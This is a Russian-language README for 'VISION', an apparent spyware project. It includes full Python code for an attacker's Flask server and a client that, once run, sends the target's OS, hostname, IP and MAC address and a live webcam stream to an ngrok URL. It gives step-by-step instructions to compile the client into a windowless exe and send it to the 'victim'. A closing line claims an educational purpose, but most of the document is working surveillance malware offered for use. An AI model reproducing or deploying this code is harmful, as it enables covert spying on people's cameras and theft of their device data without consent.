<header>

![1g](https://github.com/user-attachments/assets/9ccbb479-f5e6-4e3e-8946-9c7b0939294d)

# VISION

_**VISION** - это система мониторинга, предназначенная для удалённого сбора информации о жертве и её видео-трансляции в реальном времени. Сервер принимает данные о системе жертвы, 
а также видео с её камеры. Жертва, в свою очередь, отправляет эту информацию через специальное приложение, работающее на её устройстве._

1. [Структура проекта](#структура-проекта)
2. [Необходимые зависимости](#необходимые-зависимости)
3. [Быстрый старт](#быстрый-старт)
4. [Серверная часть проекта](#серверная-часть-проекта)
5. [Клиентская часть проекта](#клиентская-часть-проекта)
6. [Старт](#старт)

</header>

## Структура проекта

Проект состоит из двух частей: серверной стороны (для атакующего) и клиентской стороны (для жертвы).

![2g](https://github.com/user-attachments/assets/5b5ce637-7ee7-4aa7-bd36-f52c85afa240)

- `server.py` — Серверная часть, которая получает данные о системе жертвы и видеопоток.
- `flash.py` — Клиентская часть, которая собирает информацию о системе и передает её серверу, а также отправляет видеопоток с камеры.
- `victim_data/victim_data.json` — Файл для хранения данных о системе жертвы.
- `ngrok` — Используется для создания туннеля к серверу, чтобы жертва могла подключиться к серверу атакующего.
- `run.bat` — Командный скрипт для автоматического запуска серверной части `server.py` и `ngrok`.

## Необходимые зависимости

- `flask` — Веб-фреймворк для создания серверной части приложения. (Серверная часть)
- `pyinstaller` — Утилита для сборки python в исполняемый файл (exe).
- `cv2` — Библиотека для работы с изображениями и видео, используемая для захвата и отправки видеопотока с камеры. (Клиентская часть)
- `requests` — Библиотека для отправки HTTP-запросов, используемая для передачи данных между клиентом и сервером. (Клиентская часть)

Команда для установки всех зависимостей.  
```
pip install Flask pyinstaller opencv-python requests
```

## Быстрый старт

1.Установите VISION с GitHub напрямую или воспользовавшись командой:  
```
git clone https://github.com/hvru24/vision_ash/tree/main
```

2.Установите [все зависимости](#необходимые-зависимости) для серверной части.  

3.Запустите командный скрипт `run.bat` для запуска `server.py` и `ngrok`.  

4.Перейдите по адресу запущенного сервера (в командной строке запуска ngrok) и перейдите на сайт.  
`https://example.ngrok-free.app`  

5.Скопируйте адрес и вставьте его во `flash.py` в переменную `SERVER_URL`:  
```python
SERVER_URL = "https://example.ngrok-free.app"
```  

6.Соберите flash.py в исполняемый файл (exe). Введите команду из директории `VISION`:  
```
pyinstaller --onefile --noconsole flash.py
```

7.Перейдите в созданную папку `dist` и отправьте flash.exe жертве.

## Серверная часть проекта

Этот код реализует серверную часть с которым будет взаимодействовать клиентское приложение.  
Сервер разработан на Flask и предоставляет возможность для отображения данных.

### Установка зависимостей

Установите [все зависимости](#необходимые-зависимости) для серверной части.

Используйте команду:  
```
pip install Flask requests
```

### Импорт библиотек — `server.py`

1.`from flask import Flask, request, Response, render_template, jsonify`

- Импортируются необходимые модули из Flask для работы с веб-приложения.
- `request` требуется для обработки запросов, переданные на веб-сервер.
- `Respone` используется для создания настраиваемых HTTP-ответов.
- `render_template` позволяет рендерить HTML-шаблоны.
- `jsonify` формирует JSON-ответ, удобный для отправки данных клиенту в формате JSON.

2.`import os`

- Используется для работы с файловыми системами. В данном коде используется для проверки наличия файла `victim_data.json` и управления директориями.

3.`import json`

- Библиотека для работы с JSON-данными. Применяется для чтения и записи системной информации, переданной клиентом, в файл `victim_data.json`.

### Иницализация приложения — `server.py`

```python
app = Flask(__name__)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

`app = Flask(__name__)` — это базовая инициализация приложения Flask, необходимая для создания экземпляра веб-приложения.

`if __name__ == "__main__"` — эта строка проверяет, является ли текущий файл главным и запущен ли напрямую, а не импортирован. В случае, если условие верно, выполняется блок кода:

`app.run(host="0.0.0.0", port=5000)` — `app.run` запускает веб-сервер Flask.

Аргумент `0.0.0.0`, передаваемый в параметр `host`, указывает, что сервер будет доступен не только локально, но и из сети.

Аргумент `5000`, передаваемый в параметр `port`, указывает, что сервер будет доступен по порту 5000.

### Переменные — `server.py`

`frames = []` — переменная для хранения видеокадров в виде списка, переданные с клиента.  
`system_data = {}` — переменная для хранения системных данных в виде словаря, переданные с клиента.

### Вспомогательные функции — `server.py`

1.`load_system_data()`
```python
def load_system_data():
    global system_data
    try:
        with open("victim_data/victim_data.json", "r") as file:
            system_data = json.load(file)
    except FileNotFoundError:
        system_data = {}
```

Функция `load_system_data` предназначена для загрузки системных данных из файла `victim_data/victim_data.json` в глобальную переменную `system_data`. Если файл не найден, она инициализирует `system_data` как пустой словарь.

### Маршрутные функции — `server.py`

1.`index()`
```python
@app.route('/')
def index():
    load_system_data() 
    return render_template('index.html', title="Home", system_data=system_data)
```

Маршрутная функция `index` обрабатывает запросы на главную страницу сервера. Она загружает системные данные с помощью функции `load_system_data()` и отображает их на веб-странице с использованием шаблона `index.html`.

`render_template` — это функция из `Flask`, которая используется для рендеринга HTML-шаблонов и возвращения их в виде ответа клиенту.  
Она динамически генерирует HTML-страницу, используя шаблоны с переменными, которые передаются из Python-кода.  
Она принимает в себя аргумент в виде пути к HTML-шаблону, находящаяся по умолчанию в папке `templates`.  
Параметр `title` принимает название вкладки в виде аргумента. `system_data` передача переменной, которая будет доступна в шаблоне.

2.`upload_frame()`
```python
@app.route('/upload', methods=['POST'])
def upload_frame():
    global frames
    frame = request.files['frame'].read()
    frames.append(frame)
    return "Frame received", 200
```

Маршрутная функция принимает POST-запрос с изображением (кадром) от клиента и добавляет его в глобальный список `frames`.

`request.files` — это объект `Flask`, предоставляющий доступ к переданным данным с ключом `frame`.  
Функция `read()` читает содержимое файла и возвращает его в бинарном виде.  
Кадр в бинарном виде сохраняется в переменную `frame`, которая затем добавляется в глобальную переменную `frames`.  
Маршрутная функция возвращает ответ `Frame received` со статусом `200`.

3.`video_feed()`
```python
@app.route('/video_feed')
def video_feed():
    def generate():
        global frames
        while True:
            if frames:
                frame = frames.pop(0)
                yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
```

Маршрутная функция обрабатывает запросы для передачи видеопотока в реальном времени. Она передает изображения, полученные через `/upload`, как часть потока данных.  

`generate()` — это генератор, который будет поочередно отдавать видеокадры из глобальной переменной `frames` в ответ на HTTP-запрос в бесконечном цикле.  
Если кадры существуют `if frames`, то первый видеокадр извлекается с помощью `pop` (и удаляется из списка), затем начинается процесс отправки.

`yield` — позволяет отправлять кадры по мере их появления, а не все сразу.

`b'--frame\r\n'` — Это разделитель, который указывает границу между фреймами в ответе. В стандарте `MJPEG` каждый фрейм отделяется от другого с помощью специального разделителя.  
В данном случае это `--frame`, что означает, что каждый фрейм будет начинаться с этого символа.

`b'Content-Type: image/jpeg\r\n\r\n'` — Указывает тип содержимого (MIME-тип) для каждого фрейма — в данном случае это JPEG-изображение.

`frame` — Это сам фрейм (изображение), который был получен от клиента или хранится в памяти на сервере.

`b'\r\n'` — Это завершающий символ, который указывает конец фрейма.

Ответ формируется с помощью `Response`, а в качестве аргумента принимается результат работы `generate`.  
Используется `multipart/x-mixed-replace`, чтобы передавать кадры в формате `JPEG` как последовательность изображений в реальном времени.  
А с помощью `boundary` устанавливаем разделитель `frame`.

4.`receive_data()`
```python
@app.route('/data', methods=['POST'])
def receive_data():
    global system_data
    system_data = request.json
    with open("victim_data/victim_data.json", "w") as file:
        json.dump(system_data, file, indent=4)
    return "Data received", 200
```

Этот маршрут принимает POST-запрос с данными системы в формате `JSON`, переданными от клиента.

Параметр `system_data` — данные в формате `JSON`, которые передаются от клиента.  
Это системная информация, включающая в себя данные об ОС, версии ОС, имя хоста, IP-адреса и MAC-адреса.  
Эти данные сохраняются в файл `victim_data/victim_data.json` на сервере. Возвращается ответ `Data received` со статусом 200.

5.`get_system_data()`
```python
@app.route('/get_system_data', methods=['GET'])
def get_system_data():
    load_system_data()
    return jsonify(system_data)
```

Эта функция позволяет клиенту получить актуальные данные о системе в формате `JSON`.  
Сначала она загружает данные с помощью `load_system_data()`, затем возвращает их в ответе в виде `JSON` с помощью `jsonify`.

## Клиентская часть проекта

Этот код реализует клиентскую часть, которая будет взаимодействовать с серверной частью.  
Клиентская часть проекта предназначена для сбора и отправки системной информации на сервер, а также для захвата и передачи видеопотока с камеры.  
Она использует библиотеки `cv2` для работы с камерой и `requests` для взаимодействия с сервером.  

Программа выполняет две основные задачи:  
1.Сбор системной информации (ОС, версии ОС, имя хоста, IP-адреса и MAC-адреса).  
2.Трансляция видеокадров с веб-камеры на сервер.

### Подготовка

Перед отправкой скрипта `flash.py`, необходимо ввести нужный адрес сервера в переменную `SERVER_URL` и собрать скрипт в исполняемый файл `.exe`.  

Это важно, так как адрес меняется при каждом запуске сервера, а также у жертвы могут не быть установлены нужные зависимости для `Python` (например, `cv2`).  

Создание исполняемого файла исключит необходимость в установке `Python` и зависимостей на целевой машине.

### Изменение переменной `SERVER_URL`

Откройте flash.py для редактирования и введите адрес сервера в переменную `SERVER_URL`.
Актуальный [адрес сервера](#запуск-программы) можно получить при запуске `ngrok`.

### Установка зависимостей

Перед сборкой исполняемого файла, необходимо установить [все зависимости](#необходимые-зависимости) для клиентской части.

Используйте команду:
```
pip install pyinstaller opencv-python requests
```

### Сборка исполняемого файла

Установив `pyinstaller`, воспользуйтесь командой
```
pyinstaller --onefile --noconsole flash.py
```
из директории **`VISION`** для сборки исполняемого файла.  
Параметр `--onefile` позволяет собрать все зависимости и скрипт в один файл. `--noconsole` исключает запуск консольного окна.

После сборки и запуска сервера, перейдите в созданную папку `dist` и отправьте `flash.exe` жертве.

### Импорт библиотек — `flash.py`

1.`cv2`

- Используется для работы с видео и изображениями. Библиотека OpenCV (cv2) позволяет захватывать видео с камеры, обрабатывать изображения, а также кодировать и декодировать изображения (например, в формате JPEG).

2.`requests`

- Используется для отправки HTTP-запросов. Библиотека requests облегчает работу с HTTP-протоколом, позволяя легко отправлять запросы. В данном случае она используется для отправки данных о системе и видеокадров на сервер.

3.`platform`

- Библиотека для получения информации о платформе (операционной системе). Модуль platform позволяет получать информацию о текущей операционной системе, включая ее название, версию и другие характеристики.

4.`uuid`

- Используется для генерации уникальных идентификаторов. Библиотека uuid генерирует уникальные идентификаторы, которые могут быть полезны для идентификации устройства или пользователя.

5.`socket`

- Используется для получения имени хоста и IP-адреса устройства.

6.`time`

- Используется для контроля скорости передачи данных. Предоставляет функции для работы с временными интервалами, такими как задержка выполнения программ с помощью time.sleep().

### Переменные — `flash.py`

`SERVER_URL` — переменная для хранения адреса веб-сервера, на которую будут отправляться данные о системе и видеокадры с веб-камеры. Ее важно [заменить](#замена-переменной) перед сборкой исполняемого файла.

### Иницализация приложения — `flash.py`

```python
if __name__ == "__main__":
    print("[INFO] Отправка системной информации...")
    send_system_info()

    print("[INFO] Запуск видеотрансляции...")
    start_video_stream()
```

`if __name__ == "__main__"` — эта строка проверяет, является ли текущий файл главным и запущен ли напрямую, а не импортирован. В случае, если условие верно, выполняется блок кода:

`send_system_info()` — вызывается функция для отправки данных о системе.

`start_video_stream()` — вызывается функция для запуска камеры и отправки видеокадров на сервер.

### Вспомогательные функции — `flash.py`

1.`get_system_info()`
```python
def get_system_info():
    system_info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
    }
    return system_info
```

Функция `get_system_info` собирает информацию о системе с помощью platform и socket, а именно данные об ОС, версии ОС, имени хоста, IP-адресе и MAC-адресе.  
Возвращает данные в виде словаря.

1.`send_system_info()`
```python
def send_system_info():
    info = get_system_info()
    try:
        response = requests.post(f"{SERVER_URL}/data", json=info)
        if response.status_code == 200:
            print("[INFO] Системная информация успешно отправлена.")
        else:
            print(f"[ERROR] Не удалось отправить данные. Код: {response.status_code}")
    except Exception as e:
        print(f"[ERROR] Ошибка при отправке системных данных: {e}")
```

Функция `send_system_info` отправляет собранную системную информацию на сервер.

Она вызывает функцию `get_system_info`, чтобы получить данные, и затем отправляет их на сервер по адресу `SERVER_URL` с использованием `requests` POST-запроса.  
Если запрос успешен (статус 200), выводится сообщение о том, что данные успешно отправлены.  
В случае ошибки выводится соответствующее сообщение с кодом ошибки.  
В случае возникновении ошибки при отправке выводится сообщение `Ошибка при отправке системных данных`.  

Данные сообщения нужны только для отладки и не важны для жертвы.

1.`start_video_stream()`
```python
def start_video_stream():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("[ERROR] Камера недоступна!")
        return

    cap.set(cv2.CAP_PROP_FPS, 30)

    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                print("[ERROR] Не удалось считать кадр с камеры.")
                break

            _, buffer = cv2.imencode('.jpg', frame)

            try:
                response = requests.post(f"{SERVER_URL}/upload", files={'frame': buffer.tobytes()})
                if response.status_code != 200:
                    print(f"[ERROR] Ошибка отправки кадра. Код: {response.status_code}")
            except Exception as e:
                print(f"[ERROR] Ошибка при отправке кадра: {e}")

            time.sleep(0.03)

    finally:
        cap.release()
```

Функция `start_video_stream` захватывает видео с камеры и отправляет его на сервер для обработки.

Она использует библиотеку `cv2` для захвата видео с камеры через `cv2.VideoCapture`, которая помещается в переменную `cap`.  
В случае отсутствии прав на камеру или ее отсутствии выводится ошибка.  

`cap.set(cv2.CAP_PROP_FPS, 30)` — устанавливает количество кадров в секунду.

Далее запускается бесконечный цикл, в котором:
- `cap.read()` — захватывает один видеокадр с веб-камеры и возвращает два значения: `ret` — был ли успешно получен кадр, `frame` — сам видеокадр.

- `cv2.imencode('.jpg', frame)` — преобразует захваченный кадр в формат `JPEG` и возвращает два значения: первое — был ли успешен процесс кодирования, `buffer` — объект `numpy.ndarray`, закодированный кадр в виде байтов.

- `response = requests.post(f"{SERVER_URL}/upload", files={'frame': buffer.tobytes()})` — отправка файла с помощью POST-запроса на сервер по маршруту `/upload`.
Файл передается в виде аргумента, в котором по ключу `frame` находится обычное байтовое представление кадра.

- `time.sleep(0.03)` — делает паузу на 30 миллисекунд между отправками кадров. Это необходимо для того, чтобы не перегружать сервер слишком быстрыми запросами.

- `cap.release()` — этот метод освобождает ресурсы, связанные с видеокамерой, и завершает работу с ней. Это важно для того, чтобы после завершения работы программы камера корректно освободила все ресурсы и не осталась в состоянии "занято" для других приложений.

## Старт

### run.bat
```bat
@echo off
echo Запускаем server.py...
start python server.py

echo Запускаем ngrok...
start ngrok http 5000

echo Оба процесса запущены.
pause
```

Командный скрипт `run.bat` запускает скрипт `server.py` и файл `ngrok`.

Команда `start python server.py` запускает Python файл под названием server.py.

Команда `start ngrok http 5000` запускает `ngrok` с параметром `HTTP` для создания туннеля HTTP-протокола и параметром `5000` для указания порта, на который будет перенаправлен трафик с публичного `URL`.

### ngrok

После запуска `run.bat`, появится окно командной строки, в котором запустится `ngrok`.
```cmd
ngrok
Goodbye tunnels, hello Agent Endpoints: https://ngrok.com/r/aep
Session Status online
Account *Name* (Plan: Free)
Version 3.19.0
Region *Region*
Latency *00ms*
Web Interface *http://127.0.0.1:4040*
Forwarding https://example.ngrok-free.app -> http://localhost:5000
```

Последняя строка означает, что `ngrok` создал туннель между публичным `URL` (https://example.ngrok-free.app) и локальным сервером, который работает на порту 5000.  

Данный `URL` следует вставить в переменную `SERVER_URL` в скрипте `flash.py`.

### Замена переменной

Открываем скрипт `flash.py` и вставляем `URL` в переменную `SERVER_URL`.

```python
SERVER_URL = "https://f878-95-59-210-233.ngrok-free.app/"
```

Сохраните файл и соберите его в [исполняемый файл](#сборка-исполняемого-файла).  

После — отправьте жертве.

### Запуск исполняемого файла жертвой

Перейдите по адресу, данной ngrok и ожидайте открытие исполняемого файла жертвой.  

Как только жертва откроет файл, данные с его видеокамеры сразу же начнется транслироваться на сайте.

![3g](https://github.com/user-attachments/assets/3f4a47a8-cff6-411e-a558-141371448337)

**Проект сделан исключительно в учебно-ознакомительных целях.**
